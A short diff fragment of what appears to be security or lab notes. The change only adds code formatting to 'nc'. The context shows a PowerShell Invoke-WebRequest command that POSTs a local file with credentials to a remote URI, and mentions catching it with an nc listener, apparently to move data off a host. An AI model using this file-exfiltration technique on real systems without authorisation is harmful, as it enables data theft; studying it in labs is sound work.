@@ -107,4 +107,4 @@ $filepath = "file/to/send.txt"
 Invoke-WebRequest -uri $uri -Method POST -Infile $filepath -Credential $usercreds
 ```
 
-I cheated and listened with nc to get it off, but you have options.
+I cheated and listened with `nc` to get it off, but you have options.
